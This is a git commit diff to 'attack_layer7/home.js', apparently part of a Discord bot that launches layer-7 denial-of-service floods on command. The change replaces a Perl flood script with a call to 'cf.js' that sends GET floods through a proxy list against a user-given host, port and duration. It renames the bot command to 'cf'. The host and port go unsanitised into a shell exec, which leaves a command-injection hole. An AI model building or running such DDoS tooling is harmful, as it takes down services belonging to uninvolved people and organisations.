33b5356df75ab158d65368e0f329119e733f5b83
apaple <76417012+apaple@users.noreply.github.com>
2022-10-28 15:02:59 +0700

    Update home.js

--- attack_layer7/home.js
+++ attack_layer7/home.js
@@ -17,7 +17,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`Ex ;home 1.1.1.1 80 60`")
+	.setDescription("`Ex ;cf host time threads`")
 	.setFooter("Please do not attack government server!")
 	message.channel.send(embed1);
 	return;
@@ -25,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`perl home.pl ${host} ${port} 65500 ${duration}`, (error, stdout, stderr) => {
+exec(`node cf.js ${host} ${port} ${duration} GET proxy.txt 100`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -70,12 +70,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['home'],
+  aliases: ['cf'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'home',
+  name: 'cf',
   description: 'zxcr9999',
-  usage: 'home'
+  usage: 'cf'
 }
